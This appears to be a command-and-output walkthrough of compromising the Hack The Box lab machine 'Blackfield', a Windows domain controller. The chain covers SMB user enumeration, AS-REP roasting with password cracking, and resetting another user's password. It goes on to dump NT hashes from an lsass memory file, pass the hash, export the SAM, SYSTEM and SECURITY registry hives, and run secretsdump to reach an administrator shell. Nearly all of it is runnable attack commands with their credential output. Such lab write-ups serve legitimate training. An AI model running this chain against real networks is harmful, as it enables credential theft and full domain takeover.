# crackmapexec find domain name
$ crackmapexec smb blackfield.local
SMB         blackfield.htb  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)

# anonymous smb login
$ smbclient -N -L //10.129.229.17

        Sharename       Type      Comment
        ---------       ----      -------
	..SNIPPED..
        profiles$       Disk      
	..SNIPPED..	

# recursive list
$ smbclient //10.129.229.17/profiles$ -c 'recurse;ls' | tee output.txt
..SNIPPED..
\ZWausik
  .                                   D        0  Wed Jun  3 16:47:12 2020
  ..                                  D        0  Wed Jun  3 16:47:12 2020
..SNIPPED..

# get unique users
$ cat output.txt |grep '^\\'|sed 's/\\//g'|sort|uniq|tee users.txt
..SNIPPED..
ZMiick
ZScozzari
ZTimofeeff
ZWausik
..SNIPPED.

# get as-rep users
$ impacket-GetNPUsers -no-pass -usersfile users.txt blackfield.local/ -format hashcat -outputfile asrep.txt
..SNIPPED..
$krb5asrep$23$support@BLACKFIELD.LOCAL:a4d2c9b86afd3d25f0997a6d71c23113$b905fd6aca4ea483e98d7c867ef20c6334648c166e6a888680a571c499e9d8d0037f3c22a061ff77af819945c213ff0086d68c1705e08eeb9927bb0300186c3ccbbcc61b2a510f3f876ecccdfcd2cc9a51f3161cec8a73da75a2b95fe720a04f0dff6253c34f895a01a4839a7c8cc26679abf35a444a1ded1ac2ac86f111b65878092435f87371e7a6876bf08f22b4696c9a12e243946a163a4f153ac58b4dbaf793e659615a63dd32440749339ae29b548d03427883e67130d53243028e552c472e1b29e7b3285a6daf158acb4e320d9d0f80abffa6fb5ee3ee80eb63ad5cd1f24335b64b519e9782b5d2b72fdc6ef796d48c73
..SNIPPED..

# Crack password
$ hashcat -a 0 -m 18200 ./blackfield.txt ./weakpass_3a -D 2 -o blackfield-cracked.txt
$krb5asrep$23$support@BLACKFIELD.LOCAL:a4d2c9b86afd3d25f0997a6d71c23113$b905fd6aca4ea483e98d7c867ef20c6334648c166e6a888680a571c499e9d8d0037f3c22a061ff77af819945c213ff0086d68c1705e08eeb9927bb0300186c3ccbbcc61b2a510f3f876ecccdfcd2cc9a51f3161cec8a73da75a2b95fe720a04f0dff6253c34f895a01a4839a7c8cc26679abf35a444a1ded1ac2ac86f111b65878092435f87371e7a6876bf08f22b4696c9a12e243946a163a4f153ac58b4dbaf793e659615a63dd32440749339ae29b548d03427883e67130d53243028e552c472e1b29e7b3285a6daf158acb4e320d9d0f80abffa6fb5ee3ee80eb63ad5cd1f24335b64b519e9782b5d2b72fdc6ef796d48c73:#00^BlackKnight

# Valid credential
$ crackmapexec smb blackfield.local -u support -p '#00^BlackKnight'
SMB         blackfield.htb  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         blackfield.htb  445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight

# bloodhound
$ bloodhound-python -c All -u support -p '#00^BlackKnight' --dns-tcp -ns 10.129.229.17 -d blackfield.local
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
..SNIPPED..
INFO: Querying computer: DC01.BLACKFIELD.local

# Audit2020 password can be changed by support
$ bloodyAD --host 10.129.229.17 -d blackfield.local -u support -p '#00^BlackKnight' set password audit2020 P@ssw0rd1
[+] Password changed successfully!

# Password change successful
$ crackmapexec smb 10.129.229.17 -u audit2020 -p 'P@ssw0rd1'
SMB         10.129.229.17   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:P@ssw0rd1

# List forensics directory, get lsass.zip
smb: \memory_analysis\> ls
..SNIPPED..
  lsass.zip                           A 41936098  Thu May 28 20:25:08 2020
..SNIPPED..

# get creds from dump file
$ pypykatz lsa minidump ./lsass.DMP 
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
..SNIPPED..

# Valid credential
$ crackmapexec smb blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
SMB         blackfield.htb  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         blackfield.htb  445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 


# read user.txt
$ evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
..SNIPPED..
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> gc user.txt
..SNIPPED..]

# impacket-reg
impacket-reg blckfield.local/svc_backup@blackfield.local -hashes :9658d1d1dcd9250115e2205d9f48400d save -keyName 'HKLM\SAM' -o 'c:\temp'
impacket-reg blckfield.local/svc_backup@blackfield.local -hashes :9658d1d1dcd9250115e2205d9f48400d save -keyName 'HKLM\SYSTEM' -o 'c:\temp'
impacket-reg blckfield.local/svc_backup@blackfield.local -hashes :9658d1d1dcd9250115e2205d9f48400d save -keyName 'HKLM\SECURITY' -o 'c:\temp'


..SNIPPED..
[!] Cannot check RemoteRegistry status. Hoping it is started...
[*] Saved HKLM\SECURITY to c:\temp\SECURITY.save

# List saved sam files
*Evil-WinRM* PS C:\temp> dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/12/2023   5:29 PM          45056 SAM.save
-a----       11/12/2023   5:30 PM          32768 SECURITY.save
-a----       11/12/2023   5:30 PM       17678336 SYSTEM.save

# Secretsdump save file
$ impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
..SNIPPED..
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:71f2a0d665ea325fe817e992b7dadef88b38b10867ba5ce70bc2582f6f4aab6c53022fd48ae61d63bb15591b0259cb651c2df1b2d95a1b99b149fa94c6b62c2f77ceaf566efee4fba7ec1cc006b4575ed6f315485649fbb03de381e6f5858e56937cc1180a54c5abff518a6d298731196b5883491b15e413526d7f2f1756ebd473b3d5c6cbc47f474b0a79bcae36720fc68098855d2c65935b4c963067bc4c5deace1e6b40ffa39dfe3ea7019375424be7c812d52f2b7f64da5648b32664fa789a203d7a25fe1562e26b6f41d5bc1de1b34f2518fdf861af3e788af5a08dd3c7909c86d4984c7ee27824057a68799994
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:651aa7b2a5b485164c9b04a41a6b70dc
[*] DefaultPassword 
(Unknown User):###_ADM1N_3920_###
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xd4834e39bca0e657235935730c045b1b9934f690
dpapi_userkey:0x9fa187c3b866f3a77c651559633e2e120bc8ef6f
[*] NL$KM 
 0000   88 01 B2 05 DB 70 7A 0F  EF 52 DF 06 96 76 4C A4   .....pz..R...vL.
 0010   BD 6E 62 D1 06 63 1A 7E  31 2F A2 6D F8 6C 42 50   .nb..c.~1/.m.lBP
 0020   FC 8D 5C A4 FC 46 1B DC  7E CA 7E 76 7F 5E C2 74   ..\..F..~.~v.^.t
 0030   CF EB B6 1F 99 8A 29 CF  2C D1 1D 55 C6 01 2E 6F   ......).,..U...o
NL$KM:8801b205db707a0fef52df0696764ca4bd6e62d106631a7e312fa26df86c4250fc8d5ca4fc461bdc7eca7e767f5ec274cfebb61f998a29cf2cd11d55c6012e6f
..SNIPPED..

# Valid credentials
$ crackmapexec smb blackfield.local -u DC01$ -H 651aa7b2a5b485164c9b04a41a6b70dc
SMB         blackfield.htb  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         blackfield.htb  445    DC01             [+] BLACKFIELD.local\DC01$:651aa7b2a5b485164c9b04a41a6b70dc

# Login as admin
$ evil-winrm -i 10.129.229.17 -u administrator -p '###_ADM1N_3920_###'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
